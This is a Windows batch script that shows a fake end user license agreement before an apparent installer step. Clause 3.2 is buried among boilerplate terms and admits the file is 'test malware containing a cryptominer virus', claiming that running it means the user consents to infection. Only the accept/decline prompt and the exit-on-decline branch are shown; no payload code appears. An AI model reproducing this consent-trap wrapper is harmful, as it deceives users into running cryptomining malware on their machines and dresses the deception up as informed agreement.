@echo off
chcp 65001 >nul
title USER AGREEMENT
mode con: cols=100 lines=50
color 5
cls

echo.
echo ================================================================================
echo                            END USER LICENSE AGREEMENT
echo ================================================================================
echo.

:: Display agreement text in purple
echo By registering, logging in, clicking "Accept", or using any functionality of the Service,
echo the User confirms that they have read, fully agree to, unconditionally accept, and
echo undertake to comply with all terms of this Agreement and related documents including,
echo but not limited to: Privacy Policy, Payment Terms, Moderation Rules, License Agreement
echo and other regulatory acts that may be incorporated by reference.
echo.
echo If the User disagrees with any provision of this Agreement, they must immediately
echo cease using the Service, as further interaction with the Platform will constitute
echo acceptance of all specified terms.
echo.
echo 1.1. The Service is provided "AS IS" without any express or implied warranties,
echo including but not limited to: merchantability warranties, fitness for a particular
echo purpose, absence of errors, viruses, malware, or uninterrupted operation.
echo.
echo 1.2. The Company reserves the right to unilaterally modify the Service's functionality,
echo interface, algorithms, pricing plans, terms of service without prior notice, and may
echo suspend or completely terminate its operation for technical, legal or commercial reasons.
echo.
echo 1.3. The User agrees not to use the Service for unlawful, fraudulent, malicious or
echo other illegal purposes including but not limited to: malware distribution, phishing,
echo hacking, DDoS attacks, spam, copyright infringement, distribution of prohibited
echo content and other activities violating legislation or third-party rights.
echo.
echo 2.1. All rights to the Service including but not limited to: source code, design,
echo logos, branding, databases, graphical elements, text materials, API and other
echo components are the exclusive property of the Company and protected by intellectual
echo property laws.
echo.
echo 2.2. The User is granted a limited, non-exclusive, non-transferable, revocable
echo license to use the Service within its functional purpose, exclusively for personal
echo or commercial purposes, subject to compliance with all terms of this Agreement.
echo.
echo 3.1. The Company shall not be liable for any direct, indirect, incidental, special
echo or other damages resulting from use or inability to use the Service, including but
echo not limited to: lost profits, data loss, reputational damage, even if the Company
echo was advised of the possibility of such damages.
echo.
echo 3.2 You expressly acknowledge this is test malware containing a cryptominer virus. 
echo by running this file you consent to infect your system. we have clearly warned you.
echo no one forced you to click, run as administrator or open this file - this was your 
echo own decision made voluntarily.
echo.
echo 3.3. The Company's maximum aggregate liability to the User shall in no case exceed
echo the amount paid by the User for using the Service during the last 6 months, or
echo 100 USD, whichever is less.
echo.
echo 4.1. This Agreement is governed by and construed in accordance with Russian law,
echo without regard to conflict of law principles.
echo.
echo 4.2. All disputes arising from this Agreement shall be resolved through negotiations,
echo and if no agreement is reached - in court at the Company's location.
echo.
echo 4.3. If any provision is found invalid or unenforceable, it shall not affect the
echo validity of remaining provisions which remain in full force.
echo.
echo 4.4. The Company reserves the right to modify this Agreement unilaterally by
echo publishing a new version on the Website. Continued use after modifications constitutes
echo acceptance of the new terms.
echo.

choice /c 12 /n /m ""
if errorlevel 2 (
    echo.
    echo [DECLINED] You did not accept the agreement. The program will now exit.
    timeout /t 3 >nul
    exit
)